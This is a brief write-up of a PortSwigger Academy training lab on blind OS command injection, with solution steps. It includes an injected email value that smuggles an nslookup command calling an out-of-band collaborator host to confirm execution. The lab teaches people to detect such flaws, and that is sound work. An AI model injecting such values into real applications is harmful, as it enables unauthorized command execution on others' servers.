# Lab: Blind OS command injection with out-of-band interaction

**Official PortSwigger URL:** https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band

## Lab idea

This challenge concerns blind command injection in a feedback workflow where command execution does not change the application's response. It practices recognizing a controlled out-of-band DNS interaction as evidence that server-side command execution occurred. [1]

[1]: https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band "Lab: Blind OS command injection with out-of-band interaction"

## Vulnerability in brief
OS command injection, also known as shell injection, is a vulnerability that lets an attacker cause an application server to run unintended operating-system commands. It commonly occurs when an application builds or invokes a shell command using user-controlled values without keeping those values safely separate from command syntax. Shell metacharacters or substitutions can then change how the command is interpreted.

## Solution idea
1. Use Burp Suite to intercept and modify the request that submits feedback.
2. Modify the email parameter, changing it to: email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||
3. Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated in the modified email parameter.

## Payloads / key values
- `email`
- `email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||`

## Official source
- [PortSwigger Academy: Lab: Blind OS command injection with out-of-band interaction](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band)
